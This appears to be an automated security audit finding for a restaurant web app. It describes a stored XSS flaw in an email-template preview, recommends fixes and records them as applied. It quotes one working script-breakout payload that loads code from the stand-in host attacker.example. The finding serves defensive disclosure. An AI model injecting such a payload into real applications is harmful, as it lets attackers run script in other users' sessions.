# [HIGH] Stored XSS through email template JSON-LD preview

**File:** [`src/app/api/ops/restaurants/[id]/email-templates/[templateKey]/route.ts`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/src/app/api/ops/restaurants/[id]/email-templates/[templateKey]/route.ts#L33-L42) (lines 33, 39, 42)
**Project:** nabatableLP
**Severity:** HIGH • **Confidence:** high • **Slug:** `xss`

## Owners

**Suggested assignee:** `159779640+amanshresthaa@users.noreply.github.com` _(via last-committer)_

## Finding

PATCH validates and persists template variants, but the schema permits '<' and '</script>' in fields such as ctaLabel. Those saved values later flow into renderAnnotationScript, which embeds annotation.actionName via JSON.stringify inside a <script type="application/ld+json"> without escaping '<' (server/emails/base.ts:94). The ops email preview renders preview.html in an unsandboxed srcDoc iframe (src/components/features/email-templates/EmailTemplatesPreviewPane.tsx:179), so a payload like </script><script src=//attacker.example/x></script> can break out of the JSON-LD script and execute in the app origin when another ops user views the preview.

## Recommendation

Use a safe JSON serializer for script contexts, e.g. JSON.stringify(data).replace(/</g, '\\u003c'), and sandbox the preview iframe without script or same-origin privileges unless scripts are required. If email templates are plain text only, also reject '<' in stored template fields.

## Revalidation

**Verdict:** fixed

PATCH still persists template variants, but it now validates them with updateRestaurantEmailTemplateSchema before calling upsertRestaurantEmailTemplate. That schema applies plainTextSchema to ctaLabel, subject, headline, and intro, rejecting script markup such as </script> and unsafe control characters. The write path is also restaurant-admin gated through ensureTemplateWriteAccess and requireAdminMembership, so only owners/managers can edit templates, although the important XSS fix is the output encoding. Saved variants later rendered in previews flow into renderAnnotationScript, which now uses safeJsonForHtmlScript rather than raw JSON.stringify, so < characters in annotation.actionName are encoded as \u003c and cannot break out of the JSON-LD script. EmailTemplatesPreviewPane additionally renders srcDoc in an iframe with sandbox="", disabling scripts. This protects both newly saved variants and old database values that might predate the schema change. Commit 020a7389 introduced the schema hardening, safe JSON serializer, and sandboxed preview iframe, so the stored XSS finding is fixed.

## Recent committers (`git log`)

- amanshresthaa <159779640+amanshresthaa@users.noreply.github.com> (2026-04-01)
